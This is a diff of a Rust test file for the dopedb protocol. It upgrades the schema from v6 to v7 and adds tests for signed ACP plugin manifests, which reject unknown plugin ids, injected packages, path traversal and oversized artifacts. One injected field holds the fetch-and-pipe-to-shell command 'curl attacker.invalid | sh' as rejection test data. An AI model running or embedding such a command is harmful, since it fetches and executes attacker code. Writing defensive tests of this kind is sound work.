@@ -1,15 +1,17 @@
 use dopedb_protocol::{
-    catalog::CatalogSnapshot, decode_arguments, AgentSessionRegisterArguments, AppOpenCommand,
-    AppOpenResult, AuthenticationRequirement, CatalogSearchCommand, CatalogShowCommand,
-    CommandName, CommandSpec, ConnectionListCommand, ConnectionShowCommand, ConnectionTestCommand,
-    DashboardCreateCommand, DatabaseListCommand, DocumentRunCommand, ErrorCode, OfficialAcpAdapter,
-    OperationCancelCommand, OperationShowCommand, OperationWaitCommand, ProtocolError,
-    QueryCancelCommand, QueryPlanCommand, QueryRunCommand, ReportAppendEvidenceCommand,
-    ReportProposeCommand, RequestEnvelope, ResponseEnvelope, RuntimeDiscovery, SchemaListCommand,
-    SessionAuthentication,
+    catalog::CatalogSnapshot, decode_arguments, AcpPluginArtifact, AcpPluginCompatibility,
+    AcpPluginId, AcpPluginLicense, AcpPluginManifestV1, AcpPluginProvider, AcpPluginUpstream,
+    AgentSessionRegisterArguments, AppOpenCommand, AppOpenResult, AuthenticationRequirement,
+    CatalogSearchCommand, CatalogShowCommand, CommandName, CommandSpec, ConnectionListCommand,
+    ConnectionShowCommand, ConnectionTestCommand, DashboardCreateCommand, DatabaseListCommand,
+    DocumentRunCommand, ErrorCode, OperationCancelCommand, OperationShowCommand,
+    OperationWaitCommand, ProtocolError, QueryCancelCommand, QueryPlanCommand, QueryRunCommand,
+    ReportAppendEvidenceCommand, ReportProposeCommand, RequestEnvelope, ResponseEnvelope,
+    RuntimeDiscovery, SchemaListCommand, SessionAuthentication, SignedAcpPluginManifestV1,
     SkillInstallCommand, SkillRemoveCommand, SkillRepairCommand, SkillStatusCommand,
     SkillsGetCommand, SkillsListCommand, SqlProposeCommand, StatusCommand, StatusResult,
-    TableDescribeCommand, VersionCommand, VersionResult, COMMAND_SCHEMA_VERSION, PROTOCOL_MAX,
+    TableDescribeCommand, VersionCommand, VersionResult, ACP_PLUGIN_MANIFEST_SCHEMA_VERSION,
+    COMMAND_SCHEMA_VERSION, PROTOCOL_MAX,
 };
 use serde::Deserialize;
 use serde_json::{json, Value};
@@ -189,7 +191,7 @@ fn assert_cli_command_types(command: CommandName, request: &RequestEnvelope, res
 }
 
 #[test]
-fn query_plan_request_matches_v6_command_schema_and_pinned_agent_registration() {
+fn query_plan_request_matches_v7_command_schema_and_pinned_agent_registration() {
     let source = include_str!("fixtures/query-plan-request.json");
     let request: RequestEnvelope =
         serde_json::from_str(source).expect("request fixture must decode");
@@ -212,31 +214,95 @@ fn query_plan_request_matches_v6_command_schema_and_pinned_agent_registration() 
     assert!(serialized.get("token").is_none());
 
     let registration = AgentSessionRegisterArguments {
-        adapter: OfficialAcpAdapter::Claude,
+        plugin_id: AcpPluginId::Claude,
         launcher_executable: "/opt/homebrew/bin/npx".into(),
         launcher_resolved_executable: "/opt/homebrew/bin/node".into(),
         launcher_sha256: "ab".repeat(32),
     };
     assert!(registration.validate());
     assert_eq!(
-        OfficialAcpAdapter::parse("claude"),
-        Some(registration.adapter)
+        AcpPluginId::parse("dopedb.acp.claude"),
+        Some(registration.plugin_id)
     );
-    assert_eq!(OfficialAcpAdapter::parse("shell"), None);
+    assert_eq!(AcpPluginId::parse("claude"), None);
+    assert_eq!(AcpPluginId::parse("attacker.plugin"), None);
     assert_eq!(
-        registration.adapter.pinned_npm_package(),
-        "@agentclientprotocol/claude-agent-acp@0.63.0"
+        registration.plugin_id.local_cli_environment(),
+        "CLAUDE_CODE_EXECUTABLE"
     );
-    assert_eq!(
-        OfficialAcpAdapter::Codex.pinned_npm_package(),
-        "@agentclientprotocol/codex-acp@1.1.7"
-    );
+    assert_eq!(AcpPluginId::Codex.local_cli_environment(), "CODEX_PATH");
     let mut registration_json = serde_json::to_value(&registration).unwrap();
     registration_json["package"] = json!("attacker/package@latest");
     assert!(serde_json::from_value::<AgentSessionRegisterArguments>(registration_json).is_err());
     let mut invalid_digest = registration;
     invalid_digest.launcher_sha256 = "AB".repeat(32);
     assert!(!invalid_digest.validate());
+
+    let manifest = AcpPluginManifestV1 {
+        schema_version: ACP_PLUGIN_MANIFEST_SCHEMA_VERSION,
+        plugin_id: AcpPluginId::Claude,
+        provider: AcpPluginProvider::Claude,
+        adapter_version: "0.63.0".into(),
+        adapter_bundle_version: "1.0.0".into(),
+        adapter_entrypoint: "dist/index.js".into(),
+        upstream: AcpPluginUpstream {
+            repository: "https://github.com/agentclientprotocol/claude-agent-acp".into(),
+            tag: "v0.63.0".into(),
+            commit: "ab".repeat(20),
+        },
+        compatibility: AcpPluginCompatibility {
+            acp_protocol_min: "2025-11-25".into(),
+            acp_protocol_max: "2025-11-25".into(),
+            node_version_min: "24.0.0".into(),
+            node_version_max: "24.99.99".into(),
+            dopedb_version_min: "0.3.33".into(),
+            dopedb_version_max: "0.3.99".into(),
+        },
+        artifact: AcpPluginArtifact {
+            url: "https://github.com/json-choi/dopedb/releases/download/acp-bundle-1/claude.tar.gz"
+                .into(),
+            sha256: "cd".repeat(32),
+            signature: "fixture-signature".into(),
+            key_id: "dopedb-acp-1".into(),
+            packed_bytes: 1024,
+            unpacked_bytes: 4096,
+        },
+        licenses: vec![AcpPluginLicense {
+            name: "Apache-2.0".into(),
+            path: "licenses/NOTICE.txt".into(),
+        }],
+        sbom_sha256: "ef".repeat(32),
+        released_at: "2026-08-08T00:00:00Z".into(),
+        revoked_at: None,
+        rollout_basis_points: 1_000,
+    };
+    assert!(manifest.validate());
+    let signed = SignedAcpPluginManifestV1 {
+        manifest: manifest.clone(),
+        manifest_sha256: "12".repeat(32),
+        signature: "fixture-manifest-signature".into(),
+        key_id: "dopedb-acp-1".into(),
+    };
+    assert!(signed.validate_shape());
+    let mut signed_json = serde_json::to_value(&signed).unwrap();
+    assert_eq!(
+        signed_json["manifest"]["pluginId"],
+        json!("dopedb.acp.claude")
+    );
+    signed_json["downloadCommand"] = json!("curl attacker.invalid | sh");
+    assert!(serde_json::from_value::<SignedAcpPluginManifestV1>(signed_json).is_err());
+    let mut unknown_provider = manifest.clone();
+    unknown_provider.provider = AcpPluginProvider::Codex;
+    assert!(!unknown_provider.validate());
+    let mut traversal = manifest.clone();
+    traversal.adapter_entrypoint = "../adapter.js".into();
+    assert!(!traversal.validate());
+    let mut oversized = manifest;
+    oversized.artifact.packed_bytes = 31 * 1024 * 1024;
+    assert!(!oversized.validate());
+    oversized.artifact.packed_bytes = 1024;
+    oversized.compatibility.node_version_min = "25.0.0".into();
+    assert!(!oversized.validate());
 }
 
 #[test]
@@ -513,13 +579,13 @@ fn unknown_envelope_and_active_command_fields_fail_closed() {
 }
 
 #[test]
-fn command_names_match_the_v6_catalog() {
+fn command_names_match_the_v7_catalog() {
     let actual = dopedb_protocol::CommandName::ALL
         .into_iter()
         .map(|command| command.as_str())
         .collect::<Vec<_>>();
     let expected: Vec<String> =
-        serde_json::from_str(include_str!("fixtures/command-catalog-v6.json")).unwrap();
+        serde_json::from_str(include_str!("fixtures/command-catalog-v7.json")).unwrap();
     assert_eq!(actual, expected);
 
     let request: RequestEnvelope = serde_json::from_value(json!({
